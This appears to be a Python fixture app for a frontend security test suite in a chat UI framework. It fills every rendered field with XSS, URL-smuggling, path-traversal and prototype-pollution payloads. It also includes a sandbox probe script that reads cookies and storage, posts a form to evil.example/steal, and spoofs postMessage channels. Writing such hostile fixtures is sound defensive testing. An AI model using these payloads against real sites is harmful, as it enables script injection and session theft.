"""Hostile fixture app for the frontend security suite (web/e2e/security.spec.ts).

Everything the model (or a careless developer config) could put on the page carries an
XSS / URL-smuggling payload. Each payload calls ``alert(...)`` — the suite fails on any
dialog, any script-ish attribute in the DOM, or any dangerous href/src.
"""
import json

import dyui
from dyui import ui

X = "<img src=x onerror=alert('cfg')>"

app = dyui.App(
    title=f"Hostile </title><script>alert('title')</script>",
    description=f"desc {X}",
    welcome=f"Welcome {X}",
    placeholder=f"Say {X}",
    starters=[dyui.Starter(f"start {X}", "md", icon="\"><img src=x onerror=alert('icon')>")],
    persist=False,
)

MARKDOWN = """# Heading <script>alert('h1')</script>

[a](javascript:alert('a')) [b](JAVASCRIPT:alert('b')) [c](java&#x09;script:alert('c'))
[d](&#106;avascript:alert('d')) [e](data:text/html,<script>alert('e')</script>)
[f](vbscript:msgbox('f')) [g](//evil.example/g) [h](/\\evil.example/h) [i](\\\\evil.example/i)
[j](<javascript:alert('j')>) [k](%6A%61vascript:alert('k')) [l](  javascript:alert('l'))
[m](https://example.com/"onmouseover="alert('m')) [n](api/files/../../etc/passwd)
[o](/api/files/f_abc/../../../x) [p](javascript&colon;alert('p'))
<a href="javascript:alert('raw')">raw anchor</a> <img src=x onerror=alert('rawimg')>
<script>alert('script')</script> <iframe src="javascript:alert('ifr')"></iframe>
<javascript:alert('auto')> <https://example.com/ok>
![x](javascript:alert('imgjs')) ![y](data:image/svg+xml,<svg onload=alert('svg')>)
[ref][1] and [ref2][2]

[1]: javascript:alert('ref')
[2]: data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

```js" onmouseover="alert('lang')
<script>alert('code')</script>
```

```html
<img src=x onerror=alert('codehtml')>
```

| col <img src=x onerror=alert('th')> |
|---|
| <script>alert('td')</script> |
"""

J = "javascript:alert('u')"
D = "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>"
COMPONENTS = [
    {"ui": "markdown", "text": MARKDOWN},
    {"ui": "callout", "title": X, "text": f"[x]({J}) {X}", "level": "warning"},
    {"ui": "quote", "text": X, "author": X, "source": J},
    {"ui": "sources", "items": [{"title": X, "url": J}, {"title": "ok", "url": "https://example.com", "snippet": X},
                                {"title": "proto", "url": "//evil.example/x"}]},
    {"ui": "badges", "items": [{"label": X, "color": "red;background:url(https://evil.example/t)"}]},
    {"ui": "code", "code": "<script>alert('c')</script>", "language": "\"><img src=x onerror=alert('cl')>", "filename": X},
    {"ui": "table", "columns": [X, "url"], "rows": [[X, J], ["<svg onload=alert(1)>", "https://example.com/\"><x"],
                                                    ["/api/files/../x", "//evil.example"]], "caption": X},
    {"ui": "keyvalue", "items": [{"key": X, "value": J}, {"key": "v", "value": "data:text/html,<script>alert(1)</script>"}]},
    {"ui": "stat", "label": X, "value": X, "delta": X, "help": X},
    {"ui": "chart", "kind": "bar", "title": X, "unit": X, "labels": [X, "</text><script>alert(1)</script>"],
     "series": [{"name": X, "data": [1, 2]}]},
    {"ui": "chart", "kind": "pie", "labels": [X], "series": [{"name": "<svg/onload=alert(1)>", "data": [3]}]},
    {"ui": "timeline", "items": [{"title": X, "time": X, "text": X}]},
    {"ui": "json", "title": X, "data": {X: X, "__proto__": {"polluted": True}, "constructor": {"prototype": {"x": 1}}}},
    {"ui": "image", "src": J, "alt": X, "caption": X},
    {"ui": "image", "src": D},
    {"ui": "gallery", "images": [{"src": J}, {"src": "//evil.example/a.png"}, {"src": "https://example.com/a.png\" onerror=\"alert(1)"}]},
    {"ui": "video", "src": "https://evilyoutube.com/watch?v=abcdefghijk", "caption": X},
    {"ui": "video", "src": "https://www.youtube.com/watch?v=abc\"><script>"},
    {"ui": "video", "src": J, "poster": J},
    {"ui": "audio", "src": J, "title": X},
    {"ui": "file", "name": X, "url": J},
    {"ui": "file", "name": "x", "url": "/api/files/..%2f..%2fsecret"},
    {"ui": "link_preview", "url": J, "title": X, "description": X, "image": D, "site": X},
    {"ui": "card", "title": X, "subtitle": X, "image": J, "badge": X,
     "children": [{"ui": "markdown", "text": f"[nested]({J})"}, {"ui": "html", "html": "<script>alert('nested-html')</script>"}],
     "actions": [{"label": X, "action": "go", "style": "primary"}]},
    {"ui": "list", "items": [{"title": X, "subtitle": X, "image": J, "meta": X, "action": "pick"}]},
    {"ui": "tabs", "tabs": [{"label": X, "children": [{"ui": "image", "src": J}]}]},
    {"ui": "accordion", "items": [{"title": X, "children": [{"ui": "markdown", "text": f"![a]({J})"}]}]},
    {"ui": "buttons", "items": [{"label": X, "action": "x", "style": "\"><img src=x onerror=alert(1)>"}]},
    {"ui": "quick_replies", "options": [X, "javascript:alert(1)"]},
    {"ui": "choice", "question": X, "options": [X, "b"], "allow_other": True},
    {"ui": "form", "title": X, "fields": [
        {"name": "a\"><img src=x onerror=alert(1)>", "label": X, "type": "text", "placeholder": X, "default": X},
        {"name": "s", "label": "s", "type": "select", "options": [X]}], "submit_label": X},
    {"ui": "confirm", "title": X, "text": X, "confirm_label": X, "__resolved__": {"label": "Approved (spoofed)", "values": {}}},
    {"ui": "rating", "label": X},
    {"ui": "plan", "title": X, "items": [{"title": X, "status": "active"}]},
    {"ui": "html", "html": "<script>alert('top-html')</script>"},
    {"ui": "progress", "value": 50, "label": X},
    {"ui": "divider", "label": X},
]


@app.on_chat_start
async def start(chat: dyui.Chat):
    await chat.set_title("Title </title><img src=x onerror=alert('thread')>")


@app.on_message
async def reply(msg: dyui.Message, chat: dyui.Chat):
    if msg.text.strip() == "md":
        yield MARKDOWN
        return
    if msg.text.strip() == "fence":
        # the LLM path: everything goes through the streaming fence parser + validation
        yield "Here you go.\n```dyui\n" + "\n".join(json.dumps(c) for c in COMPONENTS) + "\n```\nDone " + X
        return
    if msg.text.strip() == "dict":
        for c in COMPONENTS:
            yield c
        return
    if msg.text.strip() == "devhtml":
        # developer-authored html: runs scripts, but must stay inside its sandbox
        yield ui.Html(html=SANDBOX_PROBE)
        return
    yield f"echo: {msg.text}"


SANDBOX_PROBE = """<div id="probe">sandbox probe</div><form id="f" action="https://evil.example/steal" method="post"
target="_top"><input name="x" value="1"></form><script>
var r = [];
function t(name, fn) { try { fn(); r.push(name + ":ok"); } catch (e) { r.push(name + ":blocked"); } }
t("alert", function () { alert("iframe-alert"); });
t("parentDom", function () { return parent.document.title; });
t("cookie", function () { return document.cookie; });
t("storage", function () { return localStorage.length; });
t("popup", function () { if (!window.open("https://evil.example/pop")) throw 0; });
t("form", function () { document.getElementById("f").submit(); });
t("top", function () { top.location.href = "https://evil.example/nav"; });
// try to spoof / abuse the auto-height channel
parent.postMessage({ __dyui_html: "guess", height: 99999 }, "*");
parent.postMessage({ height: -5 }, "*");
parent.postMessage("not an object", "*");
document.getElementById("probe").textContent = r.join(" ");
</script>"""
